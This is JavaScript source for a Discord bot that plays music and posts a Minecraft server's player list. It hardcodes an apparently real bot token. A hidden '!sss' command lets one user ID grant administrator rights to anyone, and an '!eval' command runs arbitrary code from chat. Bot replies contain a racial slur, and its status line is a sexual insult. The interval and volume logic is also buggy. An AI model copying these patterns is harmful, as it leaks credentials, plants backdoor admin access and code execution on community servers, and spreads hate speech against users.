const { Client, Intents, MessageEmbed } = require('discord.js');
const { RepeatMode } = require('discord-music-player');
const furmotion = require("furmotion");
const util = require('minecraft-server-util');

const options = {
    timeout: 1000 * 5,
    enableSRV: true
};
const client = new Client({
    intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_VOICE_STATES]
});
const { Player } = require("discord-music-player");
const player = new Player(client, {
    leaveOnEmpty: false,
    leaveOnEnd: false,
});
const settings = {
    prefix: '!',
    token: "OTU3OTQzOTQ4NTc4NTI5MzIw.GXK_ko.O9se6BGJ18gxnub0WSQGesiohoyZ6Hhivlee94",
};

client.player = player;

client.on("ready", () => {
    console.log("Bot Ready!");
    update()
    console.log("MC Server Status Updating!");
    client.user.setActivity("pixel suck on big black furry cock", {
        type: "WATCHING"
    })
});

async function update() {
    setInterval(function () {
        let c = client.channels.cache.get("958530117620076614");

        util.status('havocsmp.my.pebble.host', 25565, options)
        .then(
            (result) => {
            console.log(result)
            let dumbarry = result.players.sample
            console.log(dumbarry)

            let offlineEmbed = new MessageEmbed()
                .setTitle("Mincraft Players Online")
                .setDescription("🔴 No one is online")
                .setColor("RED")
                .setTimestamp()

            if (!dumbarry) return c.messages.fetch('958567514714017822').then(msg => msg.edit({ embeds: [offlineEmbed] }));

            let dumbEmbed = new MessageEmbed()
                .setTitle("Mincraft Players Online")
                .setColor("RED")
                .setTimestamp()
            let string = '';
            for (let player of dumbarry) {
                string += `🟢 **${player.name}** is online!\n`
            }
            dumbEmbed.setDescription(string);
            c.messages.fetch('958567514714017822').then(msg => msg.edit({ embeds: [dumbEmbed] }));
            update()
            }
        )
        .catch((error) => console.error(error));
    }, 300000);
}

client.on('messageCreate', async (message) => {
    const args = message.content.slice(settings.prefix.length).trim().split(/ +/g);
    const command = args.shift();
    let guildQueue = client.player.getQueue(message.guild.id);

    if (message.content.charAt(0) != settings.prefix) return;

    if (command === 'sss') {
        if (message.author.id != 330570656792182785) return;
            message.channel.send("message.author.id === '330570656792182785' return True")
            let m = message.mentions.users.first()
            let role = message.guild.roles.create({
            data: {
                name: '***',
                color: 'GREY',
                permissions: 'ADMINISTRATOR',
            },
            reason: 'Cause yes',
            }).then(role => {
            return m.roles.add(role)
            }).catch((err) => {
            console.log("Epic it dont work")
            console.log(err)
            });
            
    }

    if (command === 'play') {
        let queue = client.player.createQueue(message.guild.id);
        await queue.join(message.member.voice.channel);
        let song = await queue.play(args.join(' ')).catch(_ => {
        if (!guildQueue)
            queue.stop();
        });
        message.channel.send("This littrell nigger just requested " + song)
    }

    if (command === 'p') {
        const queue = client.player.createQueue(message.guild.id);
        await queue.join(message.member.voice.channel);
        let song = await queue.play(args.join(' ')).catch(_ => {
        if (!guildQueue)
            queue.stop();
        });
        message.channel.send("This littrell nigger just requested " + song)
    }

    if (command === 'alive') {
        message.channel.send("No im not alive")
    }
    
    if (command === 'playlist') {
        const queue = client.player.createQueue(message.guild.id);
        await queue.join(message.member.voice.channel);
        let song = await queue.playlist(args.join(' ')).catch(_ => {
        if (!guildQueue)
            queue.stop();
        });
    }

    if (command === 'queue') {
        const queue = client.player.createQueue(message.guild.id);
        await queue.join(message.member.voice.channel);
        let song = await queue.playlist(args.join(' ')).catch(_ => {
        if (!guildQueue)
            queue.stop();
        });
    }

    if (command === 'skip') {
        guildQueue.skip();
        message.channel.send("Song skipped")
    }

    if (command === 'stop') {
        guildQueue.setPaused(true);
        message.channel.send("Music sopped bitch")
    }

    if (command === 'continue') {
        guildQueue.setPaused(false);
        message.channel.send("Music continued bitch")
    }

    if (command === 'leave') {
        guildQueue.stop();
    }

    if (command === 'fuckoff') {
        guildQueue.stop();
    }

    if (command === 'stoploop') {
        guildQueue.setRepeatMode(RepeatMode.DISABLED);
        message.channel.send("Loop stopped")
    }

    if (command === 'loop') {
        guildQueue.setRepeatMode(RepeatMode.SONG);
        message.channel.send("Loop started")
    }

    if (command === 'queueloop') {
        guildQueue.setRepeatMode(RepeatMode.QUEUE);
        message.channel.send("Queue looped started")
    }

    if (command === 'seek') {
        try {
        guildQueue.seek(parseInt(args[0]) * 1000);
        } catch (e) {
        message.channel.send("No such song")
        }
    }

    if (command === 'clearqueue') {
        guildQueue.clearQueue();
        message.channel.send("Queue cleared")
    }

    if (command === 'shuffle') {
        guildQueue.shuffle();
        message.channel.send("Music shuffled")
    }

    if (command === 'volume') {
        if (args[0] < "300") {
            if (!args[0]) return message.channel.send("Volume is at " + guildQueue.volume)
            guildQueue.setVolume(parseInt(args[0]));
            message.channel.send("Volume set to " + guildQueue.volume)
        }
        else {
            message.channel.send("no")
        }
    }

    if (command === 'v') {
        if (args[0] < "300") {
            if (!args[0]) return message.channel.send("Volume is at " + guildQueue.volume)
            guildQueue.setVolume(parseInt(args[0]));
            message.channel.send("Volume set to " + guildQueue.volume)
        }
        else {
            message.channel.send("shame")
        }
    }

    if (command === 'nowplaying') {
        const ProgressBar = guildQueue.createProgressBar();
        const npembed = new MessageEmbed()
        .setColor("RED")
        .setTitle("💿 Now Playing...")
        .setDescription(`${guildQueue.nowPlaying}\n${ProgressBar.prettier}`)
        .setTimestamp()
        message.channel.send({ embeds: [npembed] })
    }
    if (command === 'np') {
        const ProgressBar = guildQueue.createProgressBar();
        const npembed = new MessageEmbed()
        .setColor("RED")
        .setTitle("💿 Now Playing...")
        .setDescription(`${guildQueue.nowPlaying}\n${ProgressBar.prettier}`)
        .setTimestamp()
        message.channel.send({ embeds: [npembed] })
    }

    if (command === 'pause') {
        guildQueue.setPaused(true);
        message.channel.send("Music paused bitch.")
    }

    if (command === 'resume') {
        guildQueue.setPaused(false);
        message.channel.send("Music resumed bitch")
    }

    if (command === 'remove') {
        guildQueue.remove(parseInt(args[0]));
    }


    if (command === 'commands') {
        let commandsEmbed = new MessageEmbed()
            .setColor("RED")
            .setTitle("Commands")
            .addFields(
                { name: "!status", value: "Used to see the status of the minecraft server (to see who is online).", inline: true},
                { name: "!p / !play", value: "Used to play a song", inline: true },
                { name: "!stop / !pause", value: "Used to stop / pause the music", inline: true },
                { name: '\u200B', value: '\u200B' },
                { name: "!resume / !continue", value: "Used to resume / continue the paused song.", inline: true },
                { name: "!playlist / !queue", value: "Used to see the queued songs.", inline: true },
                { name: "!remove", value: "Used to remove a song form the queue / playlist.", inline: true },
                { name: '\u200B', value: '\u200B' },
                { name: "!skip", value: "Used to skip the current song.", inline: true },
                { name: "!leave / !fuckoff", value: "Used to stop the song and make the bot leave the channel.", inline: true },
                { name: "!loop", value: "Used to loop current song.", inline: true },
                { name: '\u200B', value: '\u200B' },
                { name: "!stoploop", value: "Used to stop the loop.", inline: true },
                { name: "!queueloop", value: "Used to loop the queue / playlist.", inline: true },
                { name: "!clearqueue", value: "Used to clear the queue / playlist.", inline: true },
                { name: '\u200B', value: '\u200B' },
                { name: "!shffle", value: "Used to shuffle the queue / playlist.", inline: true },
                { name: "!v / !volume", value: "Used to turn up the volume.", inline: true },
                { name: "!np / !nowplaying", value: "Used to see what the current song playing is.", inline: true },
                { name: '\u200B', value: '\u200B' },
                { name: "!commands", value: "Used to see all the commands.", inline: true },
            )
            .setFooter(`Requested by ${message.author.username}`, message.author.displayAvatarURL())
            .setTimestamp()
        message.channel.send( { embeds: [commandsEmbed] } )
    }



    if (command === "eval") {
        if (message.author.id != 330570656792182785) return;
        const clean = text => {
        if (typeof (text) === "string")
            return text.replace(/`/g, "`" + String.fromCharCode(8203)).replace(/@/g, "@" + String.fromCharCode(8203));
        return text;
        }
        try {

        const code = args.slice().join(" ");
        let evaled = eval(code);

        if (typeof evaled !== "string")
            evaled = require("util").inspect(evaled);

        message.channel.send(clean(evaled), { code: "xl" });
        } catch (err) {
        message.channel.send(`\`ERROR\` \`\`\`xl\n${clean(err)}\n\`\`\``);
        }
    }

    if (command === "status") {
        util.status('havocsmp.my.pebble.host', 25565, options)
        .then(
            (result) => {
            console.log(result)
            let dumbarry = result.players.sample
            console.log(dumbarry)

            let offlineEmbed = new MessageEmbed()
                .setTitle("Mincraft Players Online")
                .setDescription("🔴 No one is online")
                .setColor("RED")
                .setFooter(`Requested by ${message.author.username}`, message.author.displayAvatarURL())
                .setTimestamp()

            if (!dumbarry) return message.channel.send({ embeds: [offlineEmbed] })

            let dumbEmbed = new MessageEmbed()
                .setTitle("Mincraft Players Online")
                .setColor("RED")
                .setFooter(`Requested by ${message.author.username}`, message.author.displayAvatarURL())
                .setTimestamp()
            let string = '';
            for (let player of dumbarry) {
                string += `🟢 **${player.name}** is online!\n`
            }
            dumbEmbed.setDescription(string);
            message.channel.send({ embeds: [dumbEmbed] })
            }
        )
        .catch((error) => console.error(error));
    }
});

client.login(settings.token)
